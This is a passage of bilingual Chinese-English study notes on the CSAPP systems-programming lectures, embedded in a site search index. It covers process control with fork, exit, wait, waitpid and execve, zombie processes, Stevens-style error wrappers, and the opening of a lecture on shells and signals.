<p>\u8fd9\u4e09\u6b65\uff1asave previous process' context, load next process' context and transfer control to it.</p> <p>\u5f53\u7136\u4e5f\u53ef\u4ee5\u4ece\u7528\u6237\u7a0b\u5e8f\u8c03\u7528\u6765\u64cd\u4f5c\u8fdb\u7a0b\uff0c\u8fd9\u88ab\u79f0\u4f5c\u300c\u8fdb\u7a0b\u63a7\u5236\uff08process control\uff09\u300d\u3002</p> <p>System Call Error Handling</p> <p>\u200b   Linux \u7cfb\u7edf\u7ea7\u51fd\u6570\u5982\u679c\u51fa\u9519\uff0c\u5219\u4f1a\u8fd4\u56de -1\uff0c\u5e76\u4e14\u8bbe\u7f6e\u5168\u5c40\u53d8\u91cf <code>errno</code> \u6765\u6307\u793a\u3002On error, Linux system-level functions typically return -1 and set global variable <code>errno</code> to indicate cause.</p> <p>\u200b   \u4f60\u5fc5\u987b\u8981\u505a\u7684\uff08\u5f53\u8c03\u7528\u7cfb\u7edf\u7ea7\u51fd\u6570\u65f6\uff09\uff1aHard and fast rule:</p> <p>\u200b       \u4f60\u5fc5\u987b\u68c0\u67e5\u5e94\u8be5\u4f7f\u7528\u7684\u90a3\u4e9b\u7cfb\u7edf\u7ea7\u51fd\u6570\u7684\u8fd4\u56de\u503c\u3002You must check the return status of every system-level function.</p> <p>\u200b       \u552f\u4e00\u7684\u4f8b\u5916\u662f\u65e0\u8fd4\u56de\u503c\u51fd\u6570\uff08\u8fd4\u56de <code>void</code>\uff09\uff0c\u4f60\u5e94\u8be5\u5982\u4e0b\u4f8b\u5b50\u8fdb\u884c\u64cd\u4f5c\uff1a\u521b\u5efa\u4e00\u4e2a\u5b50\u8fdb\u7a0b\uff0c\u8fd4\u56de\u5176\u5b50\u8fdb\u7a0b\u7684\u72b6\u6001\u4fe1\u606f\uff0c\u8fd9\u4e2a\u4fe1\u606f\u4e0d\u5e94\u4e3a\u8d1f\u6570\uff0c\u5426\u5219\u62a5\u9519\u3002Only exception is the handful of functions that return <code>void</code>.</p> <p>\u200b   Example:</p> <pre><code>    if ((pid = fork()) &lt; 0) {\n        fprint(stderr, \"fork error: %s\\n\", strerror(errno));\n        exit(1); // \u968f\u610f\u975e\u96f6\u503c\n    }\n</code></pre> <p>Error-reporting functions (31:08)</p> <p>\u200b   Can simplify somewhat using an error_reporting function.</p> <pre><code>void unix_error(char *msg) { /* Unix-style error */\n    fprintf(stderr, \"%s: %s\\n\", msg, strerror(errno));\n    exit(1);\n}\n</code></pre> <pre><code>if ((pid = fork()) &lt; 0)\n    unix_error(\"fork error\");\n</code></pre> <p>\u200b   \u8fd9\u79cd\u7ed3\u6784\u5f88\u5e38\u7528\uff0c\u56e0\u6b64\u7531 W. Richards Stevens \u5f00\u59cb\uff0c\u5c06\u8fd9\u4e9b\u79f0\u4e3a\u5305\u88c5\u5668\uff08wrapper\uff09\u5e76\u5b9a\u4e49\u3002 </p> <p>\u200b   \u6211\u4eec\u5728\u51fd\u6570\u4e2d\u5904\u7406\u9519\u8bef\uff0c\u5f62\u6210\u4e00\u4e2a\u5305\u88c5\u5668\u3002</p> <p>Error-handling Wrappers</p> <p>\u200b   We simplify t he code we present to you even futher by using Stevens-style error-handling wrappers:</p> <pre><code>pid_t Fork(void) {\n    pid_t pid;\n    if ((pid = fork()) &lt; 0) \n        unix_error(\"Fork error\");\n    return pid;\n}\n</code></pre> <p>Obtain Process IDs</p> <p>\u200b   \u6700\u7b80\u5355\u7684\u8fdb\u7a0b\u63a7\u5236\u51fd\u6570\u662f <code>getpid</code> \u51fd\u6570\uff0c\u5141\u8bb8\u4f60\u83b7\u53d6\u5f53\u524d\u8fdb\u7a0b\u7684\u7f16\u53f7\uff08pid, process ID\uff09\uff0c\u6216\u8005\u662f\u5904\u7406\u5668\u6982\u5ff5\u4e2d\u7684\u521b\u5efa\u5f53\u524d\u8fdb\u7a0b\u7684\u7236\u8fdb\u7a0b\uff08parent process\uff09\uff0c\u5b83\u4eec\u90fd\u4e0d\u5e26\u53c2\u6570\u5e76\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\u3002</p> <p>\u200b   <code>pid_t getpid(void)</code> returns PID of current process.</p> <p>\u200b   <code>pid_t getppid(void)</code> returns PID of parent process.</p> <p>Creating and Terminating Processes</p> <p>\u200b   From a programmer's perspective, we can think of a process as being in one of three states.</p> <p>\u200b   Running</p> <p>\u200b       Process is either executing, or waiting to be executed and will eventually be scheduled \uff08\u88ab\u8c03\u5ea6\uff09(i.e., chosen to execute) by the kernel.</p> <p>\u200b   Stopped</p> <p>\u200b       Process execution is suspended\uff08\u6682\u505c\uff09 and will not be scheduled until futher notice (next lecture when we study signals)</p> <p>\u200b   Terminated</p> <p>\u200b       Process is stopped permanently.</p> <p>Terminating Processes</p> <p>\u200b   Process becomes terminated for one of three reasons:</p> <p>\u200b       \u63a5\u6536\u4fe1\u53f7 Receiving a signal whose default action is to terminate (next lecture)</p> <p>\u200b       \u4e3b\u51fd\u6570\u8fd4\u56de Returning from the <code>main</code> routine.</p> <p>\u200b       \u8c03\u7528 <code>exit</code> \u51fd\u6570 Calling the <code>exit</code> function.</p> <p>\u200b   <code>void exit(int status)</code></p> <p>\u200b       Terminates with an exit status of <code>status</code>.</p> <p>\u200b       \u60ef\u4f8b\uff1a\u6b63\u5e38\u8fd4\u56de\u503c\u4e3a 0\uff0c\u975e\u96f6\u8fd4\u56de\u503c\u8868\u660e\u4e00\u4e2a\u9519\u8bef Convention: normal return status is 0, nonzero on error.</p> <p>\u200b       \u53e6\u4e00\u79cd\u65b9\u5f0f\u662f\u4ece\u4e3b\u51fd\u6570\u4e2d\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\u503c\u4ee5\u8bbe\u663e\u5f0f\u8bbe\u7f6e\u8fd4\u56de\u72b6\u6001\u3002Another way to explicitly set the exit status is to return an integer value from the main routine.</p> <p>\u200b   <code>exit</code> is called once but never returns. </p> <p>Creating Processes</p> <p>\u200b   Parent process creates a new running child process by calling <code>fork</code>.</p> <p>\u200b   <code>int fork(void)</code></p> <p>\u200b       \u5bf9\u5b50\u8fdb\u7a0b\u8fd4\u56de\u96f6\uff0c\u5bf9\u7236\u8fdb\u7a0b\u8fd4\u56de\u5b50\u8fdb\u7a0b\u7684 PID. Returns 0 to the child process, child's PID to parent process.</p> <p>\u200b       Child is almost identical to parent.</p> <p>\u200b           \u5b50\u8fdb\u7a0b\u548c\u7236\u8fdb\u7a0b\u5206\u4eab\u540c\u4e00\u4e2a\u865a\u62df\u5185\u5b58\uff08\u7269\u7406\u5185\u5b58\u5f80\u5f80\u4e0d\u540c\uff09\u3002Child get an identical (but separent) copy of the parent's virtual address space.</p> <p>\u200b           \u5b50\u8fdb\u7a0b\u83b7\u5f97\u7236\u8fdb\u7a0b\u6253\u5f00\u6587\u4ef6\u63cf\u8ff0\u7b26\u7684\u76f8\u540c\u526f\u672c\u3002Child gets identical copies of the parent's open file descriptors.</p> <p>\u200b           Child has a different PID than the parent.</p> <p>\u200b   <code>fork</code> is interesting (and oftern confusing) because it is called once but return twice.</p> <p><code>fork</code> example</p> <p>\u200b   Call once, return twice.</p> <p>\u200b   Concurrent execution</p> <p>\u200b       Can't predict execution order of parent and child.</p> <p>\u200b   Duplicate buty separate address space.</p> <p>\u200b       <code>x</code> has a value of 1 when fork returns in parent and child.</p> <p>\u200b       Subsequent changes to <code>x</code> are independent.</p> <p>\u200b   Shared open files</p> <p>\u200b       <code>stdout</code> is the same both parent and child.</p> <pre><code>// fork.c\nint main() {\n    pid_t pid;\n    int x = 1;\n\n    pid = Fork();\n    if (pid == 0) { /* Child */\n        printf(\"child : x=%d\\n\", ++x);\n        exit(0);\n    }\n\n    /* Parent */\n    printf(\"parent: x=%d\\n\", --x);\n    exit(0);\n}\n</code></pre> <pre><code>linux&gt; ./fork\nparent: x=0\nchild: x=2\n</code></pre> <p>\u6211\u4eec\u65e0\u6cd5\u63a7\u5236\u7236\u8fdb\u7a0b\u548c\u5b50\u8fdb\u7a0b\u54ea\u4e2a\u5148\u6267\u884c\uff0c\u4f46\u662f\u53ef\u4ee5\u786e\u5b9a\u7531\u4e8e <code>x</code> \u521d\u59cb\u503c\u4e3a 1\uff0c\u6240\u4ee5\u4e00\u4e2a\u8f93\u51fa 0 \u4e00\u4e2a\u8f93\u51fa 2.</p> <p>Modeling <code>fork</code> with Process Graphs</p> <p>\u200b   A process graph is a useful tool for capturing the partial ordering of statements in a concurrent program:</p> <p>\u200b       Each vertex is the execution of a statement.</p> <p>\u200b       a -&gt; b means <code>a</code> happens before <code>b</code>.</p> <p>\u200b       Edges can be labeled with current value of variables.</p> <p>\u200b       <code>printf</code> vertices can be labeled with output.</p> <p>\u200b       Each graph begins with a vertex with no inedges.</p> <p>\u200b   Any topological sort of graph corresponding to a feasible total ordering.</p> <p>\u200b       Total ordering of vertices where all edges point from left to right.</p> <p>Process Graph Example</p> <p>\u200b   \u5bf9\u4e8e <code>fork.c</code>\uff08\u4e0a\u8ff0\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u753b\u51fa\u5982\u4e0b\u8fdb\u7a0b\u56fe\u3002</p> <pre><code>              child: x=2\n          --------&gt;o--------&gt;o    Child\n          |      printf     exit\n  x == 1  |   parent: x=0\no--------&gt;o-------&gt;o--------&gt;o    Parent\nmain     fork    printf     exit\n</code></pre> <p><code>fork</code> Example: Two consecutive <code>forks</code></p> <pre><code>// forks.c\nvoid fork2() {\n    printf(\"L0\\n\");\n    fork();\n    printf(\"L1\\n\");\n    fork();\n    printf(\"Bye\\n\");\n}\n</code></pre> <pre><code>                             Bye\n                       ------&gt;o\n                       |    printf\n               L1      |     Bye\n        -------&gt;o-----&gt;o-----&gt;o\n        |     printf  fork  printf\n        |                    Bye\n        |              ------&gt;o\n        |              |    printf\nL0      |      L1      |     Bye\no------&gt;o------&gt;o-----&gt;o-----&gt;o\nprintf fork   printf  fork  printf\n</code></pre> <p><code>fork</code> Example: Nested <code>forks</code> in parent.</p> <pre><code>void fork4() {\n    printf(\"L0\\n\");\n    if (fork() != 0) {\n        printf(\"L1\\n\");\n        if (fork() != 0) {\n            printf(\"L2\\n\");\n        }\n    }\n    printf(\"Bye\");\n}\n</code></pre> <pre><code>               Bye           Bye \n        -------&gt;o      ------&gt;o\n        |     printf   |    printf\nL0      |      L1      |      L2     Bye\no------&gt;o------&gt;o-----&gt;o-----&gt;o------&gt;o\nprintf fork   printf  fork  printf  printf\n</code></pre> <p><code>fork</code> Example: Nested <code>forks</code> in children</p> <pre><code>void fork4() {\n    printf(\"L0\\n\");\n    if (fork() == 0) {\n        printf(\"L1\\n\");\n        if (fork() == 0) {\n            printf(\"L2\\n\");\n        }\n    }\n    printf(\"Bye\");\n}\n</code></pre> <pre><code>                             L2      Bye\n                       ------&gt;o------&gt;o\n                       |    printf  printf\n               L1      |     Bye\n        -------&gt;o-----&gt;o-----&gt;o\n        |     printf  fork  printf  \nL0      |      Bye      \no------&gt;o------&gt;o\nprintf fork   printf  \n</code></pre> <p>\u56de\u6536\u5b50\u8fdb\u7a0b Reaping Child Processes</p> <p>\u200b   Idea</p> <p>\u200b       \u5f53\u8fdb\u7a0b\u7ec8\u6b62\uff0c\u5176\u4ecd\u7136\u6d88\u8017\u7cfb\u7edf\u8d44\u6e90\u3002When process terminates, it still consumes system resources</p> <p>\u200b           Examples: Exit status, various OS tables.</p> <p>\u200b       \u79f0\u4e3a\u50f5\u5c38\u8fdb\u7a0b Called a \"zombie\"</p> <p>\u200b           Living corpse, half alive and half dead</p> <p>.   Reaping</p> <p>\u200b       \u7531\u7236\u8fdb\u7a0b\u5728\u7ec8\u6b62\u5b50\u8fdb\u7a0b\u65f6\u8fdb\u884c\u3002Performed by parent on terminated child (using <code>wait</code> or <code>waitpid</code>)</p> <p>\u200b       \u7236\u8fdb\u7a0b\u88ab\u57fa\u4e8e\u9000\u51fa\u72b6\u6001\u4fe1\u606f\u3002Parent is given exit status information.</p> <p>\u200b       \u5185\u6838\u5220\u9664\u50f5\u5c38\u8fdb\u7a0b\u3002Kernel then deletes zombie child process.</p> <p>\u200b   What if parent doesn't reap?</p> <p>\u200b       \u5982\u679c\u7236\u8fdb\u7a0b\u7ec8\u6b62\u4f46\u672a\u56de\u6536\u5b50\u8fdb\u7a0b\uff0c\u5219\u7cfb\u7edf\u5b89\u6392\u7cfb\u7edf\u4e2d\u5b58\u5728\u7684\u7b2c\u4e00\u4e2a\u8fdb\u7a0b\uff08pid \u4e3a 1 \u7684 init \u8fdb\u7a0b\uff09\u6765\u56de\u6536\u3002 If any parent terminated without reaping a child, then the orphaned child will be reaped by <code>init</code> process (pid == 1)</p> <p>\u200b       \u6240\u4ee5\u53ea\u6709\u957f\u671f\u8fdb\u7a0b\u624d\u9700\u8981\u663e\u5f0f\u5730\u56de\u6536\u3002So, only need explicit reaping in long-running processes.</p> <p>\u200b           \u6bd4\u5982 Shell \u548c\u670d\u52a1\u5668\u3002e.g., shells and servers.</p> <p>\u670d\u52a1\u5668\u53ef\u80fd\u521b\u5efa\u6570\u767e\u4e07\u4e2a\u5b50\u8fdb\u7a0b\uff0c\u6bcf\u4e2a\u5b50\u8fdb\u7a0b\u7ec8\u6b62\u65f6\u90fd\u4f1a\u6210\u4e3a\u50f5\u5c38\u8fdb\u7a0b\uff0c\u5b83\u4eec\u6709\u72b6\u6001\uff0c\u8fd9\u5c31\u5360\u7528\u4e86\u5185\u6838\u7684\u7a7a\u95f4\uff0c\u5b9e\u9645\u4e0a\u8fd9\u5c31\u662f\u4e00\u79cd\u5185\u5b58\u6cc4\u6f0f\uff08memory leak\uff09\u7684\u5f62\u5f0f\u3002\u5982\u679c\u4e0d\u53bb\u56de\u6536\u8fd9\u4e9b\u50f5\u5c38\u5b50\u8fdb\u7a0b\uff0c\u6700\u7ec8\u53ef\u80fd\u4f1a\u586b\u6ee1\u5185\u5b58\u7a7a\u95f4\u5e76\u5bfc\u81f4\u5185\u6838\u5d29\u6e83\uff08crash\uff09\u3002</p> <p>Zombie Example</p> <pre><code>void fork7() {\n    if (fork() == 0) {\n        /* Child */\n        printf(\"Terminating Child, PID = %d\\n\", getpid());\n        exit(0);\n    } else {\n        printf(\"Running Parent, PID = %d\\n\", getpid());\n        while (1)\n            ; /* Infinite loop */\n    }\n}\n</code></pre> <p>\u6b64\u5904 <code>while (1)</code> \u7684\u76ee\u7684\u662f\u8ba9\u7236\u8fdb\u7a0b\u4fdd\u6301\u8fd0\u8f6c\uff0c\u8fd9\u6837\u5b50\u8fdb\u7a0b\u5c31\u4e0d\u4f1a\u88ab\u81ea\u52a8\u56de\u6536\uff0c\u4ece\u800c\u5f3a\u884c\u521b\u9020\u51fa\u8fd9\u6837\u4e00\u4e2a\u50f5\u5c38\u8fdb\u7a0b\u3002</p> <pre><code>linux&gt; ./forks 7 &amp;\n[1] 6639\nRunning Parent, PID = 6639\nTerminating Child, PID = 6640\nlinux&gt; ps\n  PID TTY          TIME CMD\n 6585 ttyp9    00:00:00 tcsh\n 6639 ttyp9    00:00:03 forks\n 6640 ttyp9    00:00:00 forks &lt;defunct&gt;\n 6641 ttyp9    00:00:00 ps\nlinux&gt; kill 6639\n[1]    Terminated\nlinux&gt; ps\n  PID TTY          TIME CMD\n 6585 ttyp9    00:00:00 tcsh\n 6642 ttyp9    00:00:00 ps\n</code></pre> <p><code>ps</code> shows child process as \"defunct\" (i.e. a zombie).</p> <p>Non-terminating Child Example</p> <pre><code>void fork8() {\n    if (fork() == 8) {\n        /* Child */\n        printf(\"Running Child, PID = %d\\n\", getpid());\n        while (1)\n            ; /* Infinite loop */\n    } else {\n        printf(\"Terminating Parent, PID = %d\\n\", getpid());\n        exit(0);\n    }\n}\n</code></pre> <pre><code>linux&gt; ./forks 8\nTerminating Parent, PID = 6675\nRunning Child, PID = 6676\nlinux&gt; ps\n  PID TTY          TIME CMD\n 6585 ttyp9    00:00:00 tcsh\n 6676 ttyp9    00:00:06 forks\n 6677 ttyp9    00:00:00 ps\nlinux&gt; kill 6676\nlinux&gt; ps\nlinux&gt; ps\n  PID TTY          TIME CMD\n 6585 ttyp9    00:00:00 tcsh\n 6678 ttyp9    00:00:00 ps\n</code></pre> <p>\u5373\u4f7f\u7236\u8fdb\u7a0b\u5df2\u7ec8\u6b62\uff0c\u4f46\u5b50\u8fdb\u7a0b\u8fd8\u5728\u8fd0\u884c\uff01Child process still active even though parent has terminated!</p> <p>Must kill child explicitly, or elese will keeping running indefinitely.</p> <p><code>wait</code> Synchronizing with Children</p> <p>\u200b   Parent reaps a child by calling the <code>wait</code> function</p> <p>\u200b   <code>int wait(int *child_status)</code></p> <p>\u200b       Suspends current process until one of its children terminates.</p> <p>\u200b       Return value is the <code>pid</code> of the child process that terminated.</p> <p>\u200b       If <code>child_status !- NULL</code>, then the integer it points to will be set to a value that indicates reason that child terminated and the exit status:</p> <p>\u200b           Checking using macros defined in <code>wait.h</code>:</p> <p>\u200b               <code>WIFEXITED</code>\u3001<code>WEXITSTATIS</code>\u3001<code>WIFSIGNALED</code>\u3001<code>WTERMSIG</code>\u3001<code>WIFSTOPPED</code>\u3001<code>WSTOPSIG</code>\u3001<code>WIFCONTINUED</code>.</p> <p>\u200b               See textbook for details.</p> <pre><code>void fork9() {\n    int child_status;\n\n    if (fork() == 0) {\n        printf(\"HC: hello from child\\n\");\n        exit(0);\n    } else {\n        printf(\"HP: hello from parent\\n\");\n        wait(&amp;child_status);\n        printf(\"CT: child has terminated\\n\");\n    }\n    printf(\"Bye\\n\");\n}\n</code></pre> <pre><code>      HC     exit\n------&gt;o-----&gt;o\n|    printf   |\n|     HP      v     CT,Bye\no-----&gt;o-----&gt;o------&gt;o\nfork printf wait    printf\n</code></pre> <p>Another <code>wait</code> example</p> <pre><code>void fork10(){\n    pid_t pid[N];\n    int i, child_status;\n\n    for (i = 0; i &lt; N; i++)\n        if ((pid[i] = fork()) == 0) {\n            exit(100+i); /* Child */\n        }\n    for (i = 0; i &lt; N; i++) { /* Parent */\n        pid_t wpid = wait(&amp;child_status);\n        if (WIFEXITED(child_status))\n            printf(\"Child %d terminated with exit status %d\\n\", wpid, WEXITSTATUS(child_status));\n        else\n            printf(\"Child %d terminate abnormally\", wpid);\n    }\n}\n</code></pre> <p>\u200b   If multiple children completed, will take in arbitrary order.</p> <p>\u200b   Can use macros WIFEXITED and WEXITSTATUS to get information about exit status.</p> <p><code>waitpid</code>: Waiting for a Specific Process</p> <pre><code>void fork10(){\n    pid_t pid[N];\n    int i, child_status;\n\n    for (i = 0; i &lt; N; i++)\n        if ((pid[i] = fork()) == 0) {\n            exit(100+i); /* Child */\n        }\n    for (i = N-1; i &gt;= 0; i--) { /* Parent */\n        pid_t wpid = waitpid(pid[i], &amp;child_status, 0);\n        if (WIFEXITED(child_status))\n            printf(\"Child %d terminated with exit status %d\\n\", wpid, WEXITSTATUS(child_status));\n        else\n            printf(\"Child %d terminate abnormally\", wpid);\n    }\n}\n</code></pre> <p>\u200b   <code>pid_t waitpid(pid_t pid, int &amp;status, int options)</code></p> <p>\u200b       Suspends current process until specific process terminates.</p> <p>\u200b       Various options (see textbook).</p> <p><code>execve</code>: Loading and Running Programs</p> <p>\u200b   <code>int execve(char *filname, char *argv[], char *envp[])</code></p> <p>\u200b   Loads and runs in the current process:</p> <p>\u200b       Executable file <code>filename</code></p> <p>\u200b           Can be object file or script file beginning with <code>#!interpreter</code> (e.g. <code>#!/bin/bash</code>)</p> <p>\u200b       ... with argument list <code>argv</code></p> <p>\u200b           By convention <code>argv[0]==filename</code>.</p> <p>\u200b       ... with environment variable list <code>envp</code>.</p> <p>\u200b           \"name = value\" strings (e.g., <code>USER=droh</code>).</p> <p>\u200b           <code>getenve</code>\u3001<code>putenv</code>\u3001<code>printenv</code>.</p> <p>\u200b   Overwrites code, data, and stack</p> <p>\u200b       Retains PID, open files and signal context.</p> <p>\u200b   Called once and never returns.</p> <p>Structure of the stack when a new program starts</p> <p></p> <p><code>execve</code> Example</p> <p></p> <p>Summary</p> <p>\u200b   Exceptions </p> <p>\u200b       Events that require nonstandard control flow.</p> <p>\u200b       Generated externally (interrupts) or internally (traps and faults).</p> <p>\u200b   Processes</p> <p>\u200b       At any given time, system has multiple active processes.</p> <p>\u200b       Only one can execute at a time on a single core, though.</p> <p>\u200b       Each process appears to have total control of processor + private memory space.</p> <p>\u200b   Spawning processes</p> <p>\u200b       Call <code>fork</code>.</p> <p>\u200b       One call, two returns.</p> <p>\u200b   PRocess completion</p> <p>\u200b       Call <code>exit</code>.</p> <p>\u200b       One call, no return.</p> <p>\u200b   Reaping and waiting for processes.</p> <p>\u200b       Call <code>wait</code> or <code>waitpid</code>.</p> <p>\u200b   Loading and running programs.</p> <p>\u200b       Call <code>execve</code> (or variant)</p> <p>\u200b       One call, (normally) no return.</p>"},{"location":"out_class_learning/freely_learning/CSAPP/L15-Exceptional-Control-Flow-Signals-and-Nonlocal-Jumps/","title":"L15 Exceptional Control Flow: Signals and Nonlocal Jumps","text":"<p>Source: https://www.bilibili.com/video/BV1iW411d7hd?p=15</p> <p>ECF Exists at All Levels of a System</p> <p>\u200b   Exceptions</p> <p>\u200b       Hardware and operating system kernel software.</p> <p>\u200b   Process Context Switch.</p> <p>\u200b       Hardware timer and kernel software.</p> <p>\u200b   Signals</p> <p>\u200b       Kernel software and application software.</p> <p>\u200b   Nonlocal Jumps</p> <p>\u200b       Application code.</p> <p>\u5176\u4e2d Exceptions \u548c Process Context Switch \u4e3a L14 \u5185\u5bb9\uff0cSignals\uff08\u4fe1\u53f7\u673a\u5236\uff09\u4e3a L15 \u5373\u672c\u6b21\u8bfe\u5185\u5bb9\uff0cNonlocal Jumps\uff08C \u7684\u975e\u672c\u5730\u8df3\u8f6c\uff09\u5219\u4e3a\u4e66\u548c\u8865\u5145\u5e7b\u706f\u7247\u6240\u8865\u5145\uff08textbook and supplemental slides\uff09\u3002</p> <p>Today</p> <p>\u200b   Shells</p> <p>\u200b   Signals</p> <p>\u200b   Nonlocal</p> <p>Linux \u8fdb\u7a0b\u5c42\u6b21\u7cfb\u7edf Linux Process Hierarchy</p> <p></p> <p>\u200b   \u6240\u6709\u8fdb\u7a0b\u90fd\u662f <code>init</code> \u8fdb\u7a0b\u7684\u5b50\u8fdb\u7a0b\uff08\u6216\u540e\u4ee3\u8fdb\u7a0b\uff09\uff0c<code>init</code> \u8fdb\u7a0b \u542f\u52a8\u65f6\u4f1a\u521b\u5efa\u5b88\u62a4\u8fdb\u7a0b\uff08daemon\uff09\uff0c\u5176\u4e00\u822c\u662f\u4e00\u4e2a\u957f\u671f\u8fd0\u884c\u7684\u7a0b\u5e8f\uff0c\u901a\u5e38\u7528\u6765\u63d0\u4f9b\u670d\u52a1\uff0c\u6bd4\u5982\u8bf4 web \u670d\u52a1\u5668\uff0c\u6216\u8005\u5176\u4ed6\u4f60\u5e0c\u671b\u4f60\u53ea\u5728\u7cfb\u7edf\u4e0a\u8fd0\u884c\u7684\u670d\u52a1\u3002\u7136\u540e\u4f1a\u521b\u5efa\u767b\u5f55\u8fdb\u7a0b\uff0c\u4e5f\u5c31\u662f\u767b\u9646 shell\uff08login shell\uff09\uff0c\u5176\u4e3a\u7528\u6237\u63d0\u4f9b\u4e86\u547d\u4ee4\u884c\u63a5\u53e3\uff08command-line interface\uff09\u3002\u5728\u5176\u4e2d\u8f93\u5165\u5e76\u6267\u884c\u547d\u4ee4\uff0c\u6bd4\u5982\u8bf4 <code>ls</code> \u547d\u4ee4\uff0c\u5b9e\u9645\u4e0a\u5b9e\u5728\u8981\u6c42 shell \u8fd0\u884c\u540d\u4e3a <code>ls</code> \u7684\u53ef\u6267\u884c\u7a0b\u5e8f\uff0c\u4e3a\u4e86\u8fd0\u884c\uff0c\u5176\u5c31\u521b\u5efa\u4e00\u4e2a\u5b50\u8fdb\u7a0b\uff0c\u5e76\u5728\u5176\u4e2d\u8fd0\u884c\u7a0b\u5e8f\u3002</p> <p>shell \u7a0b\u5e8f Shell Programs</p> <p>\u200b   A shell is an application program that runs programs on behalf of the user.</p> <p>\u200b       <code>sh</code>: Original Unix shell (Stephen Bourne, AT&amp;T Bell Labs, 1977).</p> <p>\u200b       <code>csh/tcsh</code>: BSD Unix C shell.</p> <p>\u200b       <code>bash</code>:  \"Bourne-Again\" Shell (default Linux shell).</p> <pre><code>int main() {\n    char cmdline[MAXLINE]; /* command line */\n    while (1) {\n        /* read */\n        printf(\"&gt; \");\n        Fgets(cmdline, MAXLINE, stdin);\n        if (feof(stdin))\n            exit(0);\n\n        /* evaluate */\n        eval(cmdline);\n    }\n}\n</code></pre> <p>\u200b   Execution is a sequence of read/evaluate steps.</p> <p>Simple Shell <code>eval</code> Function</p> <pre><code>void eval(char *cmdline) {\n    char *argv[MAXARGS]; /* Argument list execve() */\n    char buf[MAXLINE];   /* Holds modified command line */\n    int bg;              /* Should the job run in bg or fg */\n    pid_t pid;           /* Process id */\n\n    strcpy(buf, cmdline);\n    bg = parseline(buf, argv);\n    if (argv[0] == NULL)\n        return;          /* Ignore empty lines */\n\n    if (!builtin_command(argv)) {\n        if ((pid = Fork()) == 0) { /* Child runs user job */\n            if (execve(argv[0], argv, environ) &lt; 0) {\n                printf(\"%s: Command not found.\\n\", argv[0]);\n                exit(0);\n            }\n        }\n\n        /* Parent waits for foreground job to terminate */\n        if (!bg) {\n            int status;\n            if (waitpid(pid, &amp;status, 0) &lt; 0)\n                unix_error(\"waitfg: waitpid error\");\n        } else \n            printf(\"%d %s\", pid, cmdline);\n    }\n    return;\n}\n</code></pre> <p>\u200b   \u5728 shell \u4e2d\u6709\u4e2a\u7ea6\u5b9a\uff0c\u5982\u679c\u547d\u4ee4\u884c\u4ee5\u4e00\u4e2a <code>&amp;</code> \u7b26\u53f7\u4f5c\u4e3a\u7ed3\u5c3e\uff0c\u90a3\u4e48\u4f60\u53ef\u4ee5\u4f7f shell \u5728\u540e\u53f0\u8fd0\u884c\u6b64\u4f5c\u4e1a\uff08job\uff09\u3002\u5373 shell \u5728\u8bfb\u53d6\u4e0b\u4e00\u4e2a stub \u4e4b\u524d\uff0c\u4e0d\u4f1a\u7b49\u5f85\u8fd9\u4e2a\u4f5c\u4e1a\u5b8c\u6210\uff1b\u53cd\u4e4b\uff0c\u4f60\u5c31\u662f\u8981\u6c42 shell \u5728\u524d\u53f0\u8fd0\u884c\u6b64\u4f5c\u4e1a\uff0cshell \u4f1a\u7b49\u5f85\u5b83\u5b8c\u6210\u3002</p> <p>\u200b   <code>bg</code> for background\uff08\u540e\u53f0\uff09, <code>fg</code> for foreground\uff08\u524d\u53f0\uff09\u3002</p> <p>\u200b   shell \u6709\u4e00\u4e9b\u5185\u5efa\u7684\u547d\u4ee4\uff0cshell \u4f1a\u68c0\u67e5 <code>argv[0]</code>\uff0c\u67e5\u770b\u5176\u662f\u5426\u662f\u4e00\u4e2a\u5185\u5efa shell \u547d\u4ee4\u3002\u5982\u679c\u4e0d\u662f\u5185\u5efa\u7684\u547d\u4ee4\uff0c\u90a3\u4e48\u5c31\u662f\u5728\u8981\u6c42 shell \u8fd0\u884c\u4e00\u4e9b\u7a0b\u5e8f\uff0c\u4e8e\u662f fork \u4e00\u4e2a\u5b50\u8fdb\u7a0b\uff0c\u7136\u540e\u4f7f\u7528 execve \u5728\u5176\u4e2d\u5c1d\u8bd5\u8fd0\u884c\u8be5\u7a0b\u5e8f\u3002</p> <p>\u200b   \u56e0\u4e3a <code>execve()</code> \u9664\u975e\u6709\u9519\u8bef\u5426\u5219\u4e0d\u8fd4\u56de\uff0c\u6216\u8005\u6709\u9519\u8bef\u800c\u603b\u662f\u8fd4\u56de -1.</p> <p>\u200b   \u63a5\u4e0b\u6765\u662f\u7236\u8fdb\u7a0b\u7684\u4e8b\u60c5\uff0c\u5982\u679c\u4e0d\u662f\u5728\u540e\u53f0\u8fd0\u884c\uff0c\u4e5f\u5c31\u662f\u5728\u524d\u53f0\u8fd0\u884c\uff0c\u5219\u9700\u8981\u4f7f\u7528 waitpid \u7b49\u5f85\u8fdb\u7a0b\u7ed3\u675f\u3002\u5426\u5219\u8f93\u51fa\u4e00\u6761\u4fe1\u606f\u5e76\u7ee7\u7eed\u6267\u884c\u3002</p> <p>Problem with Simple Shell Example</p> <p>\u200b   Our example shell correctly waits for and reap foreground jobs.</p> <p>\u200b   But what about background jobs?</p> <p>\u200b       Will become zombies when they terminate.</p> <p>\u200b       Will never be reaped because shell (typically) will not terminate.</p> <p>\u200b       Will create a memory leak that could run the kernel out of memory.</p> <p>ECF to the Rescue!</p> <p>\u200b   Solution: Exceptional control flow.</p> <p>\u200b       The kernel will interrupt regular processing to alert us when a background process completes.</p> <p>\u200b       In Unix, the alert mechanism is called a signal.</p> <p>Signals</p> <p>\u200b   A signal is a small message that notifies a process that an event of some type has occurred in the system.</p> <p>\u200b       Akin to exceptions and interrupts.</p> <p>\u200b       Sent from the kernel (sometimes at the request of another process) to a process. \uff08\u5185\u6838\u4fe1\u53f7\u603b\u662f\u7531\u5185\u6838\u53d1\u51fa\uff0c\u4f46\u6709\u65f6\u8fdb\u7a0b\u4e5f\u4f1a\u53d1\u51fa\u4fe1\u53f7\uff09</p> <p>\u200b       Signal type is identified by small integer ID's ( 1-30).</p> <p>\u200b       Only information in a signal is its ID and the fact that it arrived.</p> <pre><code>  ID      Name  Default Action  Corresponding Event\n   2    SIGINT       Terminate  Used typed Ctrl-C  \n   9   SIGKILL       Terminate  Kill program (cannot override or ignore)\n  11   SIGSEGV       Terminate  Segmentation violation\n  14   SIGALRM       Terminate  Timer signal\n  17   SIGCHED          Ignore  Child stopped or terminated\n</code></pre> <p>Signal Concepts: Sending a Signal</p> <p>\u200b   Kernel sends (delivers) a signal to a destination process by updating some state in the context of 